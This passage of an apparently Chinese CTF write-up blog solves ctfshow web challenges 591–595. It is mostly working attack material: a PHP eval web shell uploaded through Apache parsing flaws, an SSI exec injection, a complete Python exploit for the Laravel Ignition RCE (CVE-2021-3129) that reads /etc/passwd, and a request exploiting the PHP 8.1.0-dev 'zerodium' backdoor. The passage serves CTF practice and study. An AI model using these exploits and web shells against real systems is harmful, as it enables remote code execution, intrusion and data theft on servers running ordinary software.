class="number">76</span>IJwwPEi<span class="number">01</span>ZedPm<span class="number">3</span>ojXAojKAPAO<span class="number">3</span><span class="variable">%2</span>FFGbG<span class="number">8</span>MzWjWpm<span class="number">06</span>JUOFD<span class="variable">%2</span>BdXnVJng<span class="number">0</span>rcD<span class="number">01</span>WJSuR<span class="number">5</span>j<span class="number">3</span>uZ<span class="number">8</span>OLzT<span class="number">63</span><span class="keyword">x</span><span class="number">5</span>P<span class="number">4</span>gnIfH<span class="number">0</span>QeHAJd<span class="number">4</span>TSkeXZI<span class="number">417</span>lHbpV<span class="variable">%2</span>FH<span class="number">1</span>V<span class="number">3</span>ZiHBosbKVHnY<span class="number">5</span>xWyPK<span class="number">8</span>ZkuMFkI<span class="number">75</span>W<span class="number">1</span>rSkmn<span class="number">6</span>KLwwNTmbsyzUzCKLCW<span class="variable">%2</span>BLryyMyGsI<span class="number">7</span>IOsYQhV<span class="number">0</span>L<span class="number">6</span>sjWTCrazTAtf<span class="number">1</span>uIKLZ<span class="number">3</span>TXTzUxQMAyT<span class="number">97</span>Myu<span class="number">4</span>B<span class="number">14</span>aMApYFdLSSaDe<span class="number">1</span>RgLIMe<span class="number">34</span>Rf<span class="number">1</span>wDJFhaVJRSBslOea<span class="number">6</span>mMAGb<span class="number">9</span>Zi<span class="number">4</span>eFVNwMd<span class="number">8</span>ewJ<span class="variable">%2</span>B<span class="number">1</span>WL<span class="number">4</span>wO<span class="number">9</span>dOkL<span class="number">1</span>Bvaqb<span class="number">4</span>NTmstWoKEaBiG<span class="number">7</span>cadodEu<span class="number">2</span>F<span class="number">5</span>rbbvBu<span class="number">8</span>G<span class="number">3</span>wE<span class="number">1</span>VkTJrEH<span class="number">3</span>HJWha<span class="variable">%2</span>Fd<span class="number">8</span>wcR<span class="number">6</span>xULniM<span class="number">67</span>BF<span class="number">98</span>sJ<span class="variable">%2</span>BnTjSUnPV<span class="number">0</span>Sblrh<span class="variable">%2</span>FctPLZjUScO<span class="number">3</span>Nc<span class="number">5</span><span class="variable">%2</span>F<span class="number">9</span>XWpV<span class="number">55</span>HqNffwazJ<span class="number">8</span>HKSiV<span class="number">3</span>P<span class="number">7</span>vOe<span class="number">4</span>KWTmW<span class="number">3</span>kXYUpmaJhCjpxQ<span class="number">9</span>zf<span class="number">9</span>MWi<span class="number">3</span>zlkryNofoehpkjku<span class="number">2</span>yOloLJSo<span class="number">3</span>X<span class="number">0</span>RzznT<span class="variable">%2</span>FAb<span class="number">3</span>yi<span class="number">6</span>VvTOaCO<span class="number">85</span>HG<span class="number">1</span>nY<span class="number">2</span>jJoEwiSS<span class="number">3</span>RZ<span class="number">178</span>BGYTnkyzF<span class="number">8</span>J<span class="variable">%2</span>FcSzUkLs<span class="number">3</span>ebAnd<span class="variable">%2</span>B<span class="number">8</span>L<span class="variable">%2</span>Fy<span class="variable">%2</span>BxBMkDp<span class="variable">%2</span>B<span class="number">0</span>pLuE<span class="number">4</span><span class="variable">%2</span>B<span class="number">0</span>QEhb<span class="number">80</span>zMHid<span class="number">2</span>OBSAaAfoBEo<span class="variable">%2</span>BlrrpMrKzKYc<span class="number">3</span><span class="keyword">x</span><span class="number">7</span>ARAZ<span class="number">85</span>dsYftQspgIEMpVIMDI<span class="number">44</span>AIAvZyp<span class="number">1</span>sM<span class="number">3</span>lPtO<span class="variable">%2</span>FgjCxZLPiGOacR<span class="variable">%2</span>BCyY<span class="number">8</span>QNopAvkoImG<span class="number">2</span>n<span class="number">5</span>IghvjrZYHf<span class="number">50</span>Pqn<span class="number">20</span>AtWv<span class="number">1</span>prtqX<span class="number">2</span>jkBlxIcwZDt<span class="number">58</span>ix<span class="number">0</span><span class="variable">%2</span>FtVyl<span class="number">8</span>fdFazZ<span class="number">0</span>fcBDbjUi<span class="number">35</span>WU<span class="number">9</span>jSGi<span class="number">72</span>CQGBmRu<span class="number">6</span>V<span class="number">8</span>UtY<span class="number">72</span>bsaEjj<span class="number">4</span>ztbTBaUrkQH<span class="number">0</span>edTDK<span class="number">0</span>ET<span class="number">2</span>iOQRUNyyu<span class="number">6</span>ADA<span class="number">1</span>rpdfCjxr<span class="number">1</span>grAk<span class="number">32</span>yc<span class="number">9</span>xUH<span class="number">6</span>hV<span class="number">7</span>aDghlVDkOiuDBCYz<span class="number">1</span>ZkyfWATGqaAj<span class="variable">%2</span>FBmdBBwLBhnjxsX<span class="number">74</span>DHoj<span class="number">0</span>O<span class="variable">%2</span>Foz<span class="number">07</span>DnXGHLvG<span class="number">7</span>ZHNbhDia<span class="number">5</span>cnnQ<span class="number">4</span>CushfzeCS<span class="number">4</span>f<span class="variable">%2</span>FPw<span class="number">7</span>KVV<span class="number">1</span>UFJD<span class="variable">%2</span>BtAcS<span class="number">2</span>XzuiJS<span class="number">430</span>pxskuxxLv<span class="number">87</span>AlLMWOcw<span class="number">2</span>t<span class="number">77</span><span class="variable">%2</span>BJmZeapdj<span class="number">86</span><span class="variable">%2</span>Fl<span class="variable">%2</span>FPI<span class="number">11</span>f<span class="variable">%2</span>BVGTMqBen<span class="number">7</span>MyHWaNq<span class="number">0</span>WbVoe<span class="number">0</span>pbNjYxRP<span class="number">66</span>nz<span class="number">8</span>Hm<span class="number">67</span>jE<span class="number">5</span>ZYKe<span class="number">78</span>QoR<span class="number">4</span>U<span class="variable">%2</span>BmpZiXJlWWfhqpmu<span class="number">2</span>S<span class="number">2</span>FPorUw<span class="number">6</span>Qe<span class="number">12</span>laMRy<span class="number">3</span>PkHzpeDM<span class="number">7</span><span class="variable">%2</span>BvrImFaAFn<span class="number">1</span>ft<span class="number">6</span>o<span class="number">2</span>u<span class="variable">%2</span>Bg<span class="number">5</span>UfgVQt<span class="number">7</span>Hc<span class="number">3</span>UnFwfisTaZYMJgPx<span class="variable">%2</span>FjGw<span class="number">6</span>TXwldNxZev&amp;_eventId<span class="operator">=</span>submit&amp;submit<span class="operator">=</span><span class="variable">%E7</span><span class="variable">%99</span><span class="variable">%BB</span><span class="variable">%E5</span><span class="variable">%BD</span><span class="variable">%95</span></span></span><br></pre></td></tr></table></figure>

<p>然后就可以了</p>
<h2 id="web591"><a href="#web591" class="headerlink" title="web591"></a>web591</h2><p>Apache HTTPD的<code>2.4.0~2.4.29</code>版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0a</code>将被按照PHP后缀进行解析，上传的时候右键插入一个<code>0a</code>即可</p>
<p><img src="/../images/achieve/2025/2/ctfshow%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/QQ20250222-180636.jpg" alt="1"></p>
<p>然后访问<code>/shell.php%0a</code></p>
<h2 id="web592"><a href="#web592" class="headerlink" title="web592"></a>web592</h2><p>httpd 多后缀解析漏洞，可能之前来说很难，但是现在你给我黑盒我都能做</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>20633b19-aa82-449f-b551-9a71f4df198b.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>237</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://20633b19-aa82-449f-b551-9a71f4df198b.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryBko2qyVuIlWXYqWP</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://20633b19-aa82-449f-b551-9a71f4df198b.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryBko2qyVuIlWXYqWP</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.php.jpg&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">phpinfo</span>();</span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryBko2qyVuIlWXYqWP--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure>

<p>访问<code>/shell.php.jpg</code></p>
<h2 id="Web593"><a href="#Web593" class="headerlink" title="Web593"></a>Web593</h2><p>Apache2 SSI远程命令执行漏洞，好久之前在buu做过，直接打SSI注入，文件后缀为<code>shtml</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web594"><a href="#web594" class="headerlink" title="web594"></a>web594</h2><p>CVE-2021-3129</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> os, uuid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exp</span>:</span><br><span class="line">    __gadget_chains = &#123;</span><br><span class="line">        <span class="string">&quot;monolog_rce1&quot;</span>: <span class="string">r&quot;&quot;&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python3 -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:].zfill(2) + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot; &gt; payload.txt&quot;&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;monolog_rce2&quot;</span>: <span class="string">r&quot;&quot;&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce2 system %s --phar phar -o php://output | base64 -w0 | python3 -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:].zfill(2) + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot; &gt; payload.txt&quot;&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;monolog_rce3&quot;</span>: <span class="string">r&quot;&quot;&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce3 system %s --phar phar -o php://output | base64 -w0 | python3 -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:].zfill(2) + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot; &gt; payload.txt&quot;&quot;&quot;</span>,</span><br><span class="line">    &#125;  <span class="comment"># phpggc链集合，暂时添加rce1后续再添加其他增强通杀能力</span></span><br><span class="line"></span><br><span class="line">    __delimiter_len = <span class="number">8</span>  <span class="comment"># 定界符长度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__vul_check</span>(<span class="params">self</span>):</span><br><span class="line">        resp = req.get(<span class="variable language_">self</span>.__url, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code != <span class="number">405</span> <span class="keyword">and</span> <span class="string">&quot;laravel&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__payload_send</span>(<span class="params">self, payload</span>):</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="line">            <span class="string">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;variableName&quot;</span>: <span class="string">&quot;cve20213129&quot;</span>,</span><br><span class="line">                <span class="string">&quot;viewFile&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        data[<span class="string">&quot;parameters&quot;</span>][<span class="string">&quot;viewFile&quot;</span>] = payload</span><br><span class="line">        resp = req.post(<span class="variable language_">self</span>.__url, headers=header, json=data, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># print(resp.text)</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__command_handler</span>(<span class="params">self, command</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        因为用户命令要注入到payload生成的命令中，为了防止影响结构，所以进行一些处理。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.__delimiter = <span class="built_in">str</span>(uuid.uuid1())[:<span class="variable language_">self</span>.__delimiter_len]  <span class="comment"># 定界符用于定位页面中命令执行结果的位置。</span></span><br><span class="line">        <span class="comment"># print(delimiter)</span></span><br><span class="line">        command = <span class="string">&quot;echo %s &amp;&amp; %s &amp;&amp; echo %s&quot;</span> % (<span class="variable language_">self</span>.__delimiter, command, <span class="variable language_">self</span>.__delimiter)</span><br><span class="line">        <span class="comment"># print(command)</span></span><br><span class="line"></span><br><span class="line">        escaped_chars = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>]  <span class="comment"># 我只想到这么多，可自行添加。</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> escaped_chars:</span><br><span class="line">            command = command.replace(c, <span class="string">&#x27;\\&#x27;</span> + c)</span><br><span class="line">        <span class="comment"># print(command)</span></span><br><span class="line">        <span class="keyword">return</span> command</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__clear_log</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.__payload_send(</span><br><span class="line">            <span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__gen_payload</span>(<span class="params">self, gadget_chain</span>):</span><br><span class="line">        gen_shell = <span class="variable language_">self</span>.__gadget_chains[gadget_chain] % (<span class="variable language_">self</span>.__command)</span><br><span class="line">        <span class="comment"># print(gen_shell)</span></span><br><span class="line">        os.system(gen_shell)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload = f.read().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&#x27;a&#x27;</span>  <span class="comment"># 添加一个字符使得两个完整的payload总是只有一个可以正常解码</span></span><br><span class="line">        os.system(<span class="string">&quot;rm payload.txt&quot;</span>)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decode_log</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.__payload_send(</span><br><span class="line">            <span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__unserialize_log</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.__payload_send(<span class="string">&quot;phar://../storage/logs/laravel.log/test.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rce</span>(<span class="params">self</span>):</span><br><span class="line">        text = <span class="variable language_">self</span>.__unserialize_log().text</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line"></span><br><span class="line">        echo_find = text.find(<span class="variable language_">self</span>.__delimiter)</span><br><span class="line">        <span class="comment"># print(echo_find)</span></span><br><span class="line">        <span class="keyword">if</span> echo_find &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> text[echo_find + <span class="variable language_">self</span>.__delimiter_len + <span class="number">1</span>: text.find(<span class="variable language_">self</span>.__delimiter, echo_find + <span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[-] RCE echo is not found.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> gadget_chain <span class="keyword">in</span> <span class="variable language_">self</span>.__gadget_chains.keys():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to use %s for exploitation.&quot;</span> % (gadget_chain))</span><br><span class="line">            <span class="variable language_">self</span>.__clear_log()</span><br><span class="line">            <span class="variable language_">self</span>.__clear_log()</span><br><span class="line">            <span class="variable language_">self</span>.__payload_send(<span class="string">&#x27;a&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">            <span class="variable language_">self</span>.__payload_send(<span class="variable language_">self</span>.__gen_payload(gadget_chain))</span><br><span class="line">            <span class="variable language_">self</span>.__decode_log()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Result:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="variable language_">self</span>.__rce())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target, command</span>):</span><br><span class="line">        <span class="variable language_">self</span>.target = target</span><br><span class="line">        <span class="variable language_">self</span>.__url = req.compat.urljoin(target, <span class="string">&quot;_ignition/execute-solution&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.__command = <span class="variable language_">self</span>.__command_handler(command)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.__vul_check():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] [%s] is seems not vulnerable.&quot;</span> % (<span class="variable language_">self</span>.target))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] You can also call obj.exp() to force an attack.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.exp()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    Exp(<span class="string">&quot;http://d6dd8126-fc54-4e61-8f63-9ca297e73c5d.challenge.ctf.show/&quot;</span>, <span class="string">&quot;cat /etc/passwd&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>还要用phpggc在同一目录才可以，给了权限之后直接干就完事了</p>
<h2 id="web595"><a href="#web595" class="headerlink" title="web595"></a>web595</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(Z_STRVAL_P(enc), <span class="string">&quot;zerodium&quot;</span>)) &#123;</span><br><span class="line">    zend_try &#123;</span><br><span class="line">        zend_eval_string(Z_STRVAL_P(enc)+<span class="number">8</span>, <span class="literal">NULL</span>, <span class="string">&quot;REMOVETHIS: sold to zerodium, mid 2017&quot;</span>);</span><br><span class="line">    &#125; zend_end_try();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查<code>enc</code>里面是否有固定的值<code>zerodium</code>，从第九个字符开始当成php代码执行，<strong>PHP 8.1.0-dev</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1783288b-d365-4d15-9514-69d3bcec3df3.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;, &quot;Google Chrome&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">User-Agentt</span><span class="punctuation">: </span>zerodiumsystem(&quot;cat /f*&quot;);</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"><span 